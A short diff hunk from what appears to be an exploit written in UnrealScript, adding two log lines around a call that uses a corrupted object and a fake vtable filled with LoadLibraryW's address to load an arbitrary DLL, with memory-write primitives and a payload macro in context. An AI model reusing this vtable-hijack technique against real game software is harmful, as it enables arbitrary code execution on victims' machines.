@@ -392,7 +392,9 @@ static final function bool Run32(out string DllPath) {
     for(I = 0x200; I < 0x300; i += 0x4) {
         FakeVtable[I / 0x4] = Ptr_LoadLibraryW.Low;
     }
+    `log("--> LoadLibraryW");
     CorruptTgt.FuncOverrideTarget(Ptr_DllPath_Data.Low);
+    `log("<-- LoadLibraryW");
 
     // restore state of CorruptTgt before exiting
     Prim.WriteI32(Ptr_FuncOverrideTarget_UFunction, `PAYLOAD.off_UFunction_LowFlags, SavedFlagsLow);
